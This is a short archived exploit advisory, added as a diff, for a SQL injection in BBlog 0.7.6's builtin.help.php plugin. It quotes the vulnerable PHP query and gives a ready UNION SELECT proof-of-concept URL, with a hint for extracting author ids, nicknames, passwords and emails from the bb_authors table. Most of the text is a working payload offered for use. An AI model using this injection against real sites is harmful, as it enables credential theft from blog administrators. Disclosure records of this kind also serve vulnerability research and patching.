@@ -1,0 +1,20 @@
+#######################################################
+########## BBlog 0.7.6 SQL Injection Vuln #############
+#######################################################
+#
+# Vulnpath: /bblog_plugins/builtin.help.php
+# 
+# Vuln: if($_GET['mod']) $pluginrow = $bBlog->get_row("select * from ".T_PLUGINS." where name='".$_GET['mod']."' and type='modifier'");
+#
+#
+#
+# PoC: ?pid=1&mod='+union+select+1,2,3,4,5,6,7,8,9,10,11,12+from+bb_authors--
+#
+# help: On the number you can see you have to set:
+#       concat_ws(0x3a,id,nickname,password,email,icq) 
+#
+#
+# Found by: IP-Sh0k
+#######################################################
+
+# milw0rm.com [2008-08-12]
